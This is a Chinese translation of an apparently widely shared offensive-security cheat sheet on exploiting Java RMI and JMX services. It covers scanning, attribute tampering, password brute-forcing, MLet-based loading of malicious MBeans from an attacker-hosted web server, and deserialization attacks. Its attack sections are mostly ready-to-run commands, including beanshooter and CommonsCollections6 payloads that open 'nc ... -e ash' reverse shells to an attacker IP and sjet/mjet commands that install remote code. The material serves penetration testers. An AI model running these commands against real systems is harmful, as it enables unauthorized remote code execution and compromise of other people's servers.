[原文文档](README.en.md)

# Java RMI

> Java RMI（远程方法调用）是一个Java API，允许在一个JVM（Java虚拟机）中运行的对象调用在另一个JVM中运行的对象的方法，即使它们在不同的物理机器上。RMI为基于Java的分布式计算提供了机制。

## 目录

* [工具](#工具)
* [检测](#检测)
* [方法论](#方法论)
    * [使用beanshooter进行RCE](#使用beanshooter进行rce)
    * [使用sjet/mjet进行RCE](#使用sjet或mjet进行rce)
    * [使用Metasploit进行RCE](#使用metasploit进行rce)
* [参考资料](#参考资料)

## 工具

* [siberas/sjet](https://github.com/siberas/sjet) - siberas JMX利用工具包
* [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - MOGWAI LABS JMX利用工具包
* [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI漏洞扫描器
* [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX枚举和攻击工具。

## 检测

* 使用[nmap](https://nmap.org/)：

  ```powershell
  $ nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
  1089/tcp open  java-rmi Java RMI
  | rmi-vuln-classloader:
  |   VULNERABLE:
  |   RMI registry default configuration remote code execution vulnerability
  |     State: VULNERABLE
  |       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
  | rmi-dumpregistry:
  |   jmxrmi
  |     javax.management.remote.rmi.RMIServerImpl_Stub
  ```

* 使用[qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)：

  ```bash
  $ rmg scan 172.17.0.2 --ports 0-65535
  [+] Scanning 6225 Ports on 172.17.0.2 for RMI services.
  [+]  [HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)
  [+]  [HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)
  [+]  [HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)
  [+]  [6234 / 6234] [#############################] 100%
  [+] Portscan finished.

  $ rmg enum 172.17.0.2 9010
  [+] RMI registry bound names:
  [+]
  [+]  - plain-server2
  [+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
  [+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
  [+]  - legacy-service
  [+]   --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
  [+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]
  [+]  - plain-server
  [+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
  [+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]
  [...]
  ```

* 使用[rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

  ```bash
  use auxiliary/scanner/misc/java_rmi_server
  set RHOSTS <IPs>
  set RPORT <PORT>
  run
  ```

## 方法论

如果Java远程方法调用（RMI）服务配置不当，它就会容易受到各种远程代码执行（RCE）方法的攻击。一种方法是托管一个MLet文件，并指示JMX服务从远程服务器加载MBeans，这可以通过使用mjet或sjet等工具实现。remote-method-guesser工具是较新的工具，它将RMI服务枚举与已知攻击策略的概述结合起来。

### 使用beanshooter进行RCE

* 列出可用属性：`beanshooter info 172.17.0.2 9010`
* 显示属性值：`beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose`
* 设置属性值：`beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean`
* 暴力破解受密码保护的JMX服务：`beanshooter brute 172.17.0.2 1090`
* 列出已注册的MBeans：`beanshooter list 172.17.0.2 9010`
* 部署MBean：`beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000`
* 枚举JMX端点：`beanshooter enum 172.17.0.2 1090`
* 调用JMX端点上的方法：`beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'`
* 调用任意公共和静态Java方法：

    ```ps1
    beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
    beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
    ```

* 标准MBean执行：`beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`
* 对JMX端点进行反序列化攻击：`beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`

### 使用sjet或mjet进行RCE

#### 要求

* Jython
* JMX服务器可以连接到攻击者控制的http服务
* JMX身份验证未启用

#### 远程命令执行

攻击包括以下步骤：

* 启动一个托管MLet和包含恶意MBeans的JAR文件的Web服务器
* 使用JMX在目标服务器上创建MBean `javax.management.loading.MLet`的实例
* 调用MBean实例的`getMBeansFromURL`方法，将Web服务器URL作为参数传递。JMX服务将连接到http服务器并解析MLet文件。
* JMX服务下载并加载MLet文件中引用的JAR文件，使恶意MBean通过JMX可用。
* 攻击者最终从恶意MBean调用方法。

使用[siberas/sjet](https://github.com/siberas/sjet)或[mogwailabs/mjet](https://github.com/mogwailabs/mjet)利用JMX

```powershell
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
jython sjet.py TARGET_IP TARGET_PORT super_secret shell
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"

jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
```

### 使用Metasploit进行RCE

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
# configure also the payload if needed
run
```

## 参考资料

* [攻击基于RMI的JMX服务 - Hans-Martin Münch - 2019年4月28日](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
* [JMX RMI - 多应用程序RCE - Red Timmy Security - 2019年3月26日](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
* [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel - 2021年8月15日](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)